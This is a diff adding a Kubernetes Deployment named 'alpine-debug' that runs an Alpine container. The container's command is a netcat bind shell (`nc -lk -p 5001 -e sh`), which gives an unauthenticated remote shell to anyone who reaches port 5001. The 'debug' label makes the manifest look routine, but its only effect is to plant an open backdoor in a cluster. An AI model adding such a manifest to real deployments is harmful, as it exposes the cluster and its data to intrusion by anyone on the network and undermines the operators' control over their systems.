@@ -1,0 +1,18 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: alpine-debug
+spec:
+  selector:
+    matchLabels:
+      app: alpine-debug
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: alpine-debug
+    spec:
+      containers:
+      - name: alpine
+        image: library/alpine:latest
+        command: ["nc","-lk","-p","5001","-e","sh"]
